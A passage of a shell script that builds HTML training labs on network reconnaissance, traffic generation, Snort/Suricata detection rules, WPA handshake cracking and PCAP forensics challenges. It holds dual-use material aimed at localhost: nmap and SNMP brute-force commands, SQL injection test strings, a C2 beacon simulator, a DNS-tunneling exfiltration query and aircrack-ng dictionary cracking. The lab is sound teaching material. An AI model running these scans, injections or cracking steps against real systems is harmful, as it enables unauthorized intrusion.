        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); min-height: 100vh; color: #e4e4e4; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #f39c12; margin-bottom: 10px; }
        .back-link { color: #00d9ff; text-decoration: none; margin-bottom: 20px; display: inline-block; }
        .section { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 25px; margin: 20px 0; }
        h2 { color: #f39c12; margin-bottom: 15px; border-bottom: 2px solid #f39c12; padding-bottom: 10px; }
        h3 { color: #e74c3c; margin: 20px 0 10px; }
        pre { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; overflow-x: auto; font-family: monospace; }
        code { color: #58a6ff; }
        .comment { color: #8b949e; }
        .warning { background: rgba(231,76,60,0.2); border-left: 4px solid #e74c3c; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .exercise { background: rgba(52,152,219,0.2); border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        ul { margin-left: 20px; line-height: 1.8; }
    </style>
</head>
<body>
    <div class="container">
        <a href="../" class="back-link">&larr; Back to Labs</a>
        <h1>&#127919; Active Reconnaissance Lab</h1>
        <p style="color: #888; margin-bottom: 20px;">Learn network enumeration and service discovery techniques</p>

        <div class="warning">
            <strong>&#9888; Legal Notice:</strong> Only perform reconnaissance on systems you own or have explicit permission to test.
            Use localhost and lab environments for practice.
        </div>

        <div class="section">
            <h2>Banner Grabbing</h2>
            <p>Identify services by connecting and reading their welcome banners.</p>

            <h3>Using Netcat</h3>
            <pre><code><span class="comment"># Basic banner grab</span>
nc -v localhost 22
nc -v localhost 80

<span class="comment"># HTTP banner (send request)</span>
echo -e "HEAD / HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc localhost 80

<span class="comment"># With timeout</span>
nc -v -w 3 localhost 21

<span class="comment"># FTP banner</span>
nc localhost 21</code></pre>

            <h3>Using Nmap</h3>
            <pre><code><span class="comment"># Version detection</span>
nmap -sV localhost

<span class="comment"># Aggressive version detection</span>
nmap -sV --version-intensity 5 localhost

<span class="comment"># Specific ports</span>
nmap -sV -p 21,22,80,443 localhost

<span class="comment"># Script-based banner grab</span>
nmap --script banner localhost</code></pre>

            <div class="exercise">
                <h4>Exercise: Service Identification</h4>
                <ol>
                    <li>Start the lab services: <code>sudo systemctl start apache2 vsftpd</code></li>
                    <li>Use netcat to grab banners from ports 21, 22, 80</li>
                    <li>Compare with nmap -sV results</li>
                    <li>What version information can you determine?</li>
                </ol>
            </div>
        </div>

        <div class="section">
            <h2>Service Enumeration</h2>

            <h3>Port Scanning Techniques</h3>
            <pre><code><span class="comment"># TCP SYN scan (stealth)</span>
sudo nmap -sS localhost

<span class="comment"># TCP connect scan</span>
nmap -sT localhost

<span class="comment"># UDP scan</span>
sudo nmap -sU localhost

<span class="comment"># Combined TCP + UDP</span>
sudo nmap -sS -sU localhost

<span class="comment"># All ports</span>
nmap -p- localhost

<span class="comment"># Top 1000 ports (default)</span>
nmap localhost

<span class="comment"># Specific port ranges</span>
nmap -p 1-1000 localhost
nmap -p 80,443,8080-8090 localhost</code></pre>

            <h3>Service-Specific Enumeration</h3>
            <pre><code><span class="comment"># HTTP enumeration</span>
nmap --script http-enum localhost
nmap --script http-headers localhost
nmap --script http-methods localhost

<span class="comment"># SMB enumeration</span>
nmap --script smb-enum-shares localhost
nmap --script smb-os-discovery localhost

<span class="comment"># DNS enumeration</span>
nmap --script dns-brute example.com</code></pre>
        </div>

        <div class="section">
            <h2>OS Fingerprinting</h2>
            <pre><code><span class="comment"># OS detection</span>
sudo nmap -O localhost

<span class="comment"># Aggressive detection</span>
sudo nmap -O --osscan-guess localhost

<span class="comment"># Combined with version</span>
sudo nmap -A localhost

<span class="comment"># Using TCP/IP stack analysis</span>
sudo nmap -O -v localhost</code></pre>

            <h3>Manual Fingerprinting Clues</h3>
            <ul>
                <li><strong>TTL values:</strong> Linux (64), Windows (128), Cisco (255)</li>
                <li><strong>Window size:</strong> Different OS have default values</li>
                <li><strong>Banner text:</strong> Often reveals OS</li>
            </ul>
        </div>

        <div class="section">
            <h2>Network Mapping</h2>

            <h3>Traceroute Analysis</h3>
            <pre><code><span class="comment"># Standard traceroute</span>
traceroute google.com

<span class="comment"># TCP traceroute (bypass ICMP blocks)</span>
sudo tcptraceroute google.com

<span class="comment"># UDP traceroute</span>
traceroute -U google.com

<span class="comment"># With nmap</span>
sudo nmap --traceroute google.com</code></pre>

            <h3>Network Discovery</h3>
            <pre><code><span class="comment"># Ping sweep</span>
nmap -sn 192.168.1.0/24

<span class="comment"># ARP scan (local network)</span>
sudo nmap -PR 192.168.1.0/24
sudo arp-scan -l

<span class="comment"># List targets only</span>
nmap -sL 192.168.1.0/24</code></pre>
        </div>

        <div class="section">
            <h2>SNMP Enumeration</h2>
            <p>SNMP (Simple Network Management Protocol) often reveals detailed system information.</p>

            <pre><code><span class="comment"># Check if SNMP is running</span>
nmap -sU -p 161 localhost

<span class="comment"># SNMP walk (requires snmpd running)</span>
snmpwalk -v2c -c public localhost

<span class="comment"># Get system info</span>
snmpwalk -v2c -c public localhost system

<span class="comment"># Get interfaces</span>
snmpwalk -v2c -c public localhost interfaces

<span class="comment"># Enumerate with nmap</span>
nmap --script snmp-info localhost
nmap --script snmp-brute localhost</code></pre>

            <div class="exercise">
                <h4>Exercise: SNMP Discovery</h4>
                <ol>
                    <li>Start SNMP: <code>sudo systemctl start snmpd</code></li>
                    <li>Try common community strings: public, private, admin</li>
                    <li>Extract system information using snmpwalk</li>
                    <li>What sensitive data can you find?</li>
                </ol>
            </div>
        </div>

        <div class="section">
            <h2>Quick Reference: Nmap Options</h2>
            <pre><code><span class="comment"># Scan Types</span>
-sS  TCP SYN scan (stealth)
-sT  TCP connect scan
-sU  UDP scan
-sA  ACK scan
-sN  NULL scan
-sF  FIN scan
-sX  Xmas scan

<span class="comment"># Discovery</span>
-sn  Ping scan only
-Pn  Skip ping (assume online)
-PR  ARP ping

<span class="comment"># Port Specification</span>
-p 22          Single port
-p 1-100       Range
-p-            All ports
--top-ports 10 Top N ports

<span class="comment"># Output</span>
-oN file.txt   Normal output
-oX file.xml   XML output
-oG file.grep  Grepable output
-oA basename   All formats

<span class="comment"># Timing</span>
-T0  Paranoid (slow)
-T3  Normal (default)
-T4  Aggressive
-T5  Insane (fast)</code></pre>
        </div>
    </div>
</body>
</html>
RECON_EOF

    log "Reconnaissance lab created"
}

#===============================================================================
# Lab 6: Traffic Generation Lab
#===============================================================================

create_traffic_lab() {
    header "Creating Traffic Generation Lab"

    cat > "${WEB_ROOT}/traffic-lab/index.html" << 'TRAFFIC_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Traffic Generation Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); min-height: 100vh; color: #e4e4e4; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #e91e63; margin-bottom: 10px; }
        .back-link { color: #00d9ff; text-decoration: none; margin-bottom: 20px; display: inline-block; }
        .section { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 25px; margin: 20px 0; }
        h2 { color: #e91e63; margin-bottom: 15px; border-bottom: 2px solid #e91e63; padding-bottom: 10px; }
        h3 { color: #f39c12; margin: 20px 0 10px; }
        pre { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; overflow-x: auto; font-family: monospace; }
        code { color: #58a6ff; }
        .comment { color: #8b949e; }
        .tip { background: rgba(46,204,113,0.2); border-left: 4px solid #2ecc71; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .exercise { background: rgba(52,152,219,0.2); border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        ul { margin-left: 20px; line-height: 1.8; }
    </style>
</head>
<body>
    <div class="container">
        <a href="../" class="back-link">&larr; Back to Labs</a>
        <h1>&#128640; Traffic Generation Lab</h1>
        <p style="color: #888; margin-bottom: 20px;">Generate specific traffic patterns for capture and analysis</p>

        <div class="section">
            <h2>HTTP Traffic Generation</h2>

            <h3>Generate HTTP Login Traffic</h3>
            <pre><code><span class="comment"># Terminal 1: Start capture</span>
sudo tcpdump -i lo -w /tmp/http_login.pcap 'port 80'

<span class="comment"># Terminal 2: Generate login traffic</span>
curl -X POST http://localhost/login.php \
    -d "username=admin&password=secret123"

<span class="comment"># Or use the Python generator</span>
python3 /opt/network-labs/traffic/http_generator.py</code></pre>

            <h3>HTTP Generator Script</h3>
            <pre><code>#!/usr/bin/env python3
"""Generate HTTP traffic for capture practice"""
import requests
from time import sleep

target = "http://localhost"

# Simulate browsing
print("[*] Generating HTTP traffic...")
requests.get(f"{target}/")
requests.get(f"{target}/about")
requests.get(f"{target}/contact")

# Simulate login
print("[*] Simulating login...")
requests.post(f"{target}/login", data={
    "username": "admin",
    "password": "FLAG{p4ssw0rd_3xf1ltr4t10n_d3t3ct3d}"
})

print("[+] Done! Analyze with Wireshark")</code></pre>

            <div class="exercise">
                <h4>Exercise: Capture and Analyze HTTP</h4>
                <ol>
                    <li>Start tcpdump capturing on port 80</li>
                    <li>Run the HTTP generator script</li>
                    <li>Stop capture and open in Wireshark</li>
                    <li>Extract the username and password from POST data</li>
                </ol>
            </div>
        </div>

        <div class="section">
            <h2>DNS Traffic Generation</h2>
            <pre><code><span class="comment"># Terminal 1: Capture DNS</span>
sudo tcpdump -i any -w /tmp/dns.pcap 'port 53'

<span class="comment"># Terminal 2: Generate DNS queries</span>
dig google.com
dig MX google.com
dig TXT google.com
dig AAAA google.com
nslookup example.com

<span class="comment"># Simulate DNS tunneling pattern (encoded data in subdomains)</span>
dig RkxBR3tkbnNfdHVubjNsX2Q0dDRfM3h0cjRjdDNkfQ.tunnel.example.com</code></pre>

            <div class="tip">
                <strong>&#128161; Tip:</strong> The subdomain above is base64-encoded. Try decoding it!
            </div>
        </div>

        <div class="section">
            <h2>FTP Traffic Generation</h2>
            <pre><code><span class="comment"># Terminal 1: Capture FTP</span>
sudo tcpdump -i lo -w /tmp/ftp.pcap 'port 21 or port 20'

<span class="comment"># Terminal 2: FTP session</span>
ftp localhost
<span class="comment"># Login: anonymous / email@example.com</span>
<span class="comment"># Commands: ls, get secret.txt, quit</span>

<span class="comment"># Or automated with Python</span>
python3 /opt/network-labs/traffic/ftp_generator.py</code></pre>

            <div class="exercise">
                <h4>Exercise: FTP File Recovery</h4>
                <ol>
                    <li>Capture FTP traffic during file transfer</li>
                    <li>Open pcap in Wireshark</li>
                    <li>Find the FTP-DATA stream</li>
                    <li>Extract the transferred file contents</li>
                </ol>
            </div>
        </div>

        <div class="section">
            <h2>Custom Traffic Patterns</h2>
            <h3>C2 Beacon Simulation</h3>
            <pre><code>#!/usr/bin/env python3
"""Simulate C2 beacon traffic pattern"""
import requests
from time import sleep
import random

c2_server = "http://localhost:8080"
beacon_interval = 5  # seconds

print("[*] Starting beacon simulation...")
for i in range(10):
    try:
        # Beacon check-in
        requests.get(f"{c2_server}/beacon",
            headers={"User-Agent": "Mozilla/5.0 Beacon"})
        print(f"[+] Beacon {i+1} sent")
    except:
        pass

    # Jitter
    sleep(beacon_interval + random.uniform(-1, 1))

print("[+] Beacon simulation complete")</code></pre>

            <h3>Port Scan Traffic</h3>
            <pre><code><span class="comment"># Generate scan traffic for IDS testing</span>
nmap -sS localhost -p 1-100

<span class="comment"># Slow scan (harder to detect)</span>
nmap -sS -T1 localhost -p 1-100

<span class="comment"># Fast scan (easy to detect)</span>
nmap -sS -T5 localhost -p 1-1000</code></pre>
        </div>

        <div class="section">
            <h2>Traffic Generator Script</h2>
            <p>Use the comprehensive generator at <code>/opt/network-labs/traffic/traffic-generator.py</code></p>
            <pre><code><span class="comment"># Generate all traffic types</span>
sudo python3 /opt/network-labs/traffic/traffic-generator.py --all

<span class="comment"># Specific types</span>
sudo python3 /opt/network-labs/traffic/traffic-generator.py --http
sudo python3 /opt/network-labs/traffic/traffic-generator.py --dns
sudo python3 /opt/network-labs/traffic/traffic-generator.py --ftp</code></pre>
        </div>
    </div>
</body>
</html>
TRAFFIC_EOF

    log "Traffic generation lab created"
}

#===============================================================================
# Lab 7: Intrusion Detection Lab
#===============================================================================

create_ids_lab() {
    header "Creating IDS Lab"

    cat > "${WEB_ROOT}/ids-lab/index.html" << 'IDS_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Intrusion Detection Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); min-height: 100vh; color: #e4e4e4; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #00bcd4; margin-bottom: 10px; }
        .back-link { color: #00d9ff; text-decoration: none; margin-bottom: 20px; display: inline-block; }
        .section { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 25px; margin: 20px 0; }
        h2 { color: #00bcd4; margin-bottom: 15px; border-bottom: 2px solid #00bcd4; padding-bottom: 10px; }
        h3 { color: #f39c12; margin: 20px 0 10px; }
        pre { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; overflow-x: auto; font-family: monospace; }
        code { color: #58a6ff; }
        .comment { color: #8b949e; }
        .rule { background: #1a1a2e; border: 2px solid #00bcd4; border-radius: 8px; padding: 15px; margin: 15px 0; font-family: monospace; }
        .tip { background: rgba(46,204,113,0.2); border-left: 4px solid #2ecc71; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .exercise { background: rgba(52,152,219,0.2); border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        ul { margin-left: 20px; line-height: 1.8; }
    </style>
</head>
<body>
    <div class="container">
        <a href="../" class="back-link">&larr; Back to Labs</a>
        <h1>&#128737; Intrusion Detection Lab</h1>
        <p style="color: #888; margin-bottom: 20px;">Write and test Snort/Suricata rules to detect malicious activity</p>

        <div class="section">
            <h2>Snort Rule Basics</h2>
            <h3>Rule Structure</h3>
            <pre><code>action protocol src_ip src_port -> dst_ip dst_port (options)

<span class="comment"># Example:</span>
alert tcp any any -> any 80 (msg:"HTTP Traffic"; sid:1000001; rev:1;)</code></pre>

            <h3>Rule Actions</h3>
            <ul>
                <li><strong>alert</strong> - Generate alert and log packet</li>
                <li><strong>log</strong> - Log packet only</li>
                <li><strong>pass</strong> - Ignore packet</li>
                <li><strong>drop</strong> - Block and log (inline mode)</li>
                <li><strong>reject</strong> - Block, log, and send reset</li>
            </ul>
        </div>

        <div class="section">
            <h2>Detecting Port Scans</h2>
            <div class="rule">
                <code>alert tcp any any -> $HOME_NET any (msg:"Possible Port Scan - SYN"; flags:S; threshold:type threshold, track by_src, count 20, seconds 5; sid:1000010; rev:1;)</code>
            </div>

            <h3>Explanation</h3>
            <ul>
                <li><code>flags:S</code> - Match SYN packets only</li>
                <li><code>threshold</code> - Alert after 20 SYN packets in 5 seconds from same source</li>
            </ul>

            <h3>Test the Rule</h3>
            <pre><code><span class="comment"># Terminal 1: Run Snort in alert mode</span>
sudo snort -A console -c /etc/snort/snort.conf -i lo

<span class="comment"># Terminal 2: Generate port scan</span>
nmap -sS localhost -p 1-100</code></pre>
        </div>

        <div class="section">
            <h2>Detecting SQL Injection</h2>
            <div class="rule">
                <code>alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection Attempt - UNION SELECT"; flow:to_server,established; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; sid:1000020; rev:1;)</code>
            </div>

            <div class="rule">
                <code>alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection Attempt - OR 1=1"; flow:to_server,established; content:"OR"; nocase; pcre:"/OR\s+[\'\"]?\d+[\'\"]?\s*=\s*[\'\"]?\d+/i"; sid:1000021; rev:1;)</code>
            </div>

            <h3>Test the Rule</h3>
            <pre><code><span class="comment"># Generate SQL injection traffic</span>
curl "http://localhost/search?q=1' UNION SELECT * FROM users--"
curl "http://localhost/login?user=admin' OR '1'='1"</code></pre>
        </div>

        <div class="section">
            <h2>Detecting Brute Force Attacks</h2>
            <div class="rule">
                <code>alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; flow:to_server; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000030; rev:1;)</code>
            </div>

            <div class="rule">
                <code>alert tcp any any -> $HOME_NET 80 (msg:"HTTP Login Brute Force"; flow:to_server,established; content:"POST"; http_method; content:"/login"; http_uri; threshold:type threshold, track by_src, count 10, seconds 30; sid:1000031; rev:1;)</code>
            </div>
        </div>

        <div class="section">
            <h2>Detecting Data Exfiltration</h2>
            <div class="rule">
                <code>alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"Large Outbound Data Transfer"; flow:to_server,established; dsize:>10000; threshold:type threshold, track by_src, count 10, seconds 60; sid:1000040; rev:1;)</code>
            </div>

            <div class="rule">
                <code>alert udp $HOME_NET any -> any 53 (msg:"DNS Tunneling - Long Query"; content:"|00 01 00 00|"; offset:4; depth:4; pcre:"/^.{50,}/"; sid:1000041; rev:1;)</code>
            </div>
        </div>

        <div class="section">
            <h2>Custom Rules File</h2>
            <p>Save rules to <code>/etc/snort/rules/local.rules</code></p>
            <pre><code><span class="comment"># /etc/snort/rules/local.rules</span>

<span class="comment"># Port Scan Detection</span>
alert tcp any any -> $HOME_NET any (msg:"PORT SCAN DETECTED"; flags:S; \
    threshold:type threshold, track by_src, count 20, seconds 5; \
    sid:1000010; rev:1;)

<span class="comment"># SQL Injection</span>
alert tcp any any -> $HOME_NET 80 (msg:"SQL INJECTION - UNION"; \
    flow:to_server,established; content:"UNION"; nocase; \
    content:"SELECT"; nocase; sid:1000020; rev:1;)

<span class="comment"># Brute Force</span>
alert tcp any any -> $HOME_NET 22 (msg:"SSH BRUTE FORCE"; \
    flow:to_server; threshold:type threshold, track by_src, \
    count 5, seconds 60; sid:1000030; rev:1;)

<span class="comment"># Data Exfil</span>
alert tcp $HOME_NET any -> any any (msg:"LARGE OUTBOUND TRANSFER"; \
    flow:to_server; dsize:>10000; sid:1000040; rev:1;)</code></pre>

            <h3>Test Rules</h3>
            <pre><code><span class="comment"># Validate configuration</span>
sudo snort -T -c /etc/snort/snort.conf

<span class="comment"># Run in console alert mode</span>
sudo snort -A console -q -c /etc/snort/snort.conf -i lo

<span class="comment"># Test with pcap replay</span>
sudo snort -A console -c /etc/snort/snort.conf -r /path/to/traffic.pcap</code></pre>
        </div>

        <div class="section">
            <h2>Suricata Rules (Similar Syntax)</h2>
            <pre><code><span class="comment"># Suricata uses similar syntax with some enhancements</span>

<span class="comment"># HTTP inspection</span>
alert http any any -> $HOME_NET any (msg:"SQL Injection in URI"; \
    http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; \
    sid:2000001; rev:1;)

<span class="comment"># TLS/SSL inspection</span>
alert tls any any -> any any (msg:"Self-signed certificate"; \
    tls.cert_subject; content:"CN=localhost"; sid:2000002; rev:1;)

<span class="comment"># Run Suricata</span>
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
sudo suricata -c /etc/suricata/suricata.yaml -r traffic.pcap</code></pre>
        </div>

        <div class="exercise">
            <h4>Exercise: Write Custom Rules</h4>
            <ol>
                <li>Write a rule to detect ICMP ping floods (>50 pings in 10 seconds)</li>
                <li>Write a rule to detect "/etc/passwd" in HTTP requests</li>
                <li>Write a rule to detect base64-encoded data in DNS queries</li>
                <li>Test each rule with appropriate traffic</li>
            </ol>
        </div>
    </div>
</body>
</html>
IDS_EOF

    log "IDS lab created"
}

#===============================================================================
# Lab 8: Wireless Concepts Lab
#===============================================================================

create_wireless_lab() {
    header "Creating Wireless Lab"

    cat > "${WEB_ROOT}/wireless-lab/index.html" << 'WIRELESS_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wireless Concepts Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); min-height: 100vh; color: #e4e4e4; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #8bc34a; margin-bottom: 10px; }
        .back-link { color: #00d9ff; text-decoration: none; margin-bottom: 20px; display: inline-block; }
        .section { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 25px; margin: 20px 0; }
        h2 { color: #8bc34a; margin-bottom: 15px; border-bottom: 2px solid #8bc34a; padding-bottom: 10px; }
        h3 { color: #f39c12; margin: 20px 0 10px; }
        pre { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; overflow-x: auto; font-family: monospace; }
        code { color: #58a6ff; }
        .warning { background: rgba(231,76,60,0.2); border-left: 4px solid #e74c3c; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .tip { background: rgba(46,204,113,0.2); border-left: 4px solid #2ecc71; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .exercise { background: rgba(52,152,219,0.2); border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        ul { margin-left: 20px; line-height: 1.8; }
        .download-btn { display: inline-block; background: #27ae60; color: #fff; padding: 10px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <a href="../" class="back-link">&larr; Back to Labs</a>
        <h1>&#128225; Wireless Concepts Lab</h1>
        <p style="color: #888; margin-bottom: 20px;">Learn WiFi security concepts using provided capture files (no actual WiFi hacking)</p>

        <div class="warning">
            <strong>&#9888; Important:</strong> This lab uses pre-captured files only. We do NOT perform actual WiFi attacks.
            Unauthorized access to wireless networks is illegal. Only test on networks you own.
        </div>

        <div class="section">
            <h2>WPA/WPA2 Handshake Analysis</h2>
            <p>The WPA 4-way handshake is used to derive session keys. Capturing it is essential for offline cracking attempts.</p>

            <h3>4-Way Handshake Process</h3>
            <pre><code>
Access Point (AP)                    Client (STA)
      |                                    |
      |  ---- Message 1: ANonce -------->  |
      |                                    |  (Client generates SNonce, PTK)
      |  <--- Message 2: SNonce, MIC ----  |
      |  (AP generates PTK, verifies MIC)  |
      |  ---- Message 3: GTK, MIC ------>  |
      |                                    |  (Client verifies MIC, installs keys)
      |  <--- Message 4: ACK, MIC -------  |
      |                                    |
      |  ====== ENCRYPTED TRAFFIC ======  |
            </code></pre>

            <h3>Analyze with Wireshark</h3>
            <pre><code><span class="comment"># Open the capture file</span>
wireshark captures/wpa_handshake.cap

<span class="comment"># Filter for EAPOL (handshake) frames</span>
eapol

<span class="comment"># You should see 4 EAPOL frames for a complete handshake</span></code></pre>

            <a href="captures/wpa_handshake.cap" class="download-btn">Download Sample Handshake</a>
        </div>

        <div class="section">
            <h2>Cracking WPA with Aircrack-ng</h2>
            <p>Using the provided capture file with a known password:</p>

            <pre><code><span class="comment"># Check if handshake is captured</span>
aircrack-ng captures/wpa_handshake.cap

<span class="comment"># Crack with wordlist</span>
aircrack-ng -w /usr/share/wordlists/rockyou.txt captures/wpa_handshake.cap

<span class="comment"># The sample file uses password: "password123"</span>
<span class="comment"># Create a small wordlist to test:</span>
echo -e "admin\n123456\npassword123\nwireless" > /tmp/wordlist.txt
aircrack-ng -w /tmp/wordlist.txt captures/wpa_handshake.cap</code></pre>

            <div class="tip">
                <strong>&#128161; Key Points:</strong>
                <ul>
                    <li>WPA/WPA2-PSK security depends entirely on password strength</li>
                    <li>Dictionary attacks work because people use weak passwords</li>
                    <li>Use long, random passwords for WiFi networks</li>
                    <li>WPA3 adds protection against offline dictionary attacks</li>
                </ul>
            </div>
        </div>

        <div class="section">
            <h2>Deauthentication Frames</h2>
            <p>Understanding how deauth attacks work (conceptually):</p>

            <h3>Deauth Frame Structure</h3>
            <pre><code>802.11 Deauthentication Frame:
┌─────────────────────────────────────────┐
│ Frame Control: 0x00c0 (Deauth)          │
│ Duration: 0x013a                        │
│ Destination: [Client MAC]               │
│ Source: [AP MAC]                        │
│ BSSID: [AP MAC]                         │
│ Sequence: varies                        │
│ Reason Code: 0x0007 (Class 3 from nonassoc)│
└─────────────────────────────────────────┘</code></pre>

            <h3>View in Wireshark</h3>
            <pre><code><span class="comment"># Filter for deauth/disassoc frames</span>
wlan.fc.type_subtype == 0x0c || wlan.fc.type_subtype == 0x0a

<span class="comment"># Alternative filter</span>
wlan.fc.type_subtype == 12</code></pre>

            <div class="warning">
                <strong>Defense:</strong> Enable 802.11w (Management Frame Protection) on your AP to prevent deauth attacks.
                Most modern routers support this feature.
            </div>
        </div>

        <div class="section">
            <h2>Analyzing Wireless Traffic</h2>

            <h3>Useful Wireshark Filters</h3>
            <pre><code><span class="comment"># All 802.11 traffic</span>
wlan

<span class="comment"># Beacon frames (AP announcements)</span>
wlan.fc.type_subtype == 8

<span class="comment"># Probe requests (clients looking for networks)</span>
wlan.fc.type_subtype == 4

<span class="comment"># Data frames only</span>
wlan.fc.type == 2

<span class="comment"># Specific SSID</span>
wlan.ssid == "TargetNetwork"

<span class="comment"># Specific MAC address</span>
wlan.addr == aa:bb:cc:dd:ee:ff</code></pre>

            <h3>Extract Information</h3>
            <pre><code><span class="comment"># List all SSIDs in capture</span>
tshark -r wireless.cap -Y "wlan.fc.type_subtype == 8" -T fields -e wlan.ssid | sort -u

<span class="comment"># List all client MACs</span>
tshark -r wireless.cap -Y "wlan.fc.type_subtype == 4" -T fields -e wlan.sa | sort -u

<span class="comment"># Show AP-client relationships</span>
tshark -r wireless.cap -Y "wlan.fc.type == 2" -T fields -e wlan.bssid -e wlan.sa -e wlan.da</code></pre>
        </div>

        <div class="section">
            <h2>WiFi Security Evolution</h2>
            <table style="width: 100%; border-collapse: collapse;">
                <tr style="background: rgba(0,0,0,0.3);">
                    <th style="padding: 10px;">Protocol</th>
                    <th style="padding: 10px;">Security</th>
                    <th style="padding: 10px;">Status</th>
                </tr>
                <tr><td style="padding: 8px;">WEP</td><td>Broken (RC4 weakness)</td><td style="color: #e74c3c;">Deprecated</td></tr>
                <tr style="background: rgba(0,0,0,0.2);"><td style="padding: 8px;">WPA</td><td>TKIP (better, still weak)</td><td style="color: #f39c12;">Legacy</td></tr>
                <tr><td style="padding: 8px;">WPA2-PSK</td><td>AES-CCMP (offline crack possible)</td><td style="color: #f1c40f;">Common</td></tr>
                <tr style="background: rgba(0,0,0,0.2);"><td style="padding: 8px;">WPA2-Enterprise</td><td>RADIUS authentication</td><td style="color: #27ae60;">Recommended</td></tr>
                <tr><td style="padding: 8px;">WPA3</td><td>SAE (resistant to offline attacks)</td><td style="color: #27ae60;">Modern</td></tr>
            </table>
        </div>

        <div class="exercise">
            <h4>Exercise: Handshake Analysis</h4>
            <ol>
                <li>Download the sample WPA handshake capture</li>
                <li>Open in Wireshark and filter for EAPOL frames</li>
                <li>Identify all 4 messages of the handshake</li>
                <li>Use aircrack-ng to crack the password</li>
                <li>What wordlist did you need? How long did it take?</li>
            </ol>
        </div>
    </div>
</body>
</html>
WIRELESS_EOF

    log "Wireless lab created"
}

#===============================================================================
# Generate PCAP Challenge Files
#===============================================================================

generate_pcap_challenges() {
    header "Generating PCAP Challenge Files"

    log "Creating PCAP generator script..."

    cat > "${SCRIPTS_DIR}/forensics/generate_pcaps.py" << 'PCAPGEN_EOF'
#!/usr/bin/env python3
"""Generate PCAP challenge files for the forensics lab"""

from scapy.all import *
import base64
import os

PCAP_DIR = "/var/www/html/network-labs/forensics-lab/pcaps"

def create_password_exfil_pcap():
    """Challenge 1: HTTP login with password in POST"""
    print("[*] Creating Challenge 1: Password Exfiltration")

    packets = []

    # TCP handshake
    ip = IP(src="192.168.1.100", dst="192.168.1.1")
    syn = TCP(sport=45678, dport=80, flags="S", seq=1000)
    packets.append(ip/syn)

    syn_ack = IP(src="192.168.1.1", dst="192.168.1.100")/TCP(sport=80, dport=45678, flags="SA", seq=2000, ack=1001)
    packets.append(syn_ack)

    ack = IP(src="192.168.1.100", dst="192.168.1.1")/TCP(sport=45678, dport=80, flags="A", seq=1001, ack=2001)
    packets.append(ack)

    # HTTP POST with credentials
    post_data = "username=admin&password=FLAG{p4ssw0rd_3xf1ltr4t10n_d3t3ct3d}"
    http_req = f"POST /login HTTP/1.1\r\nHost: 192.168.1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(post_data)}\r\n\r\n{post_data}"

    pkt = IP(src="192.168.1.100", dst="192.168.1.1")/TCP(sport=45678, dport=80, flags="PA", seq=1001, ack=2001)/Raw(load=http_req)
    packets.append(pkt)

    # HTTP Response
    http_resp = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 20\r\n\r\n<h1>Login OK</h1>"
    pkt = IP(src="192.168.1.1", dst="192.168.1.100")/TCP(sport=80, dport=45678, flags="PA", seq=2001, ack=1001+len(http_req))/Raw(load=http_resp)
    packets.append(pkt)

    wrpcap(f"{PCAP_DIR}/challenge1_password.pcap", packets)
    print(f"    Saved: {PCAP_DIR}/challenge1_password.pcap")

def create_c2_beacon_pcap():
    """Challenge 2: C2 beacon traffic"""
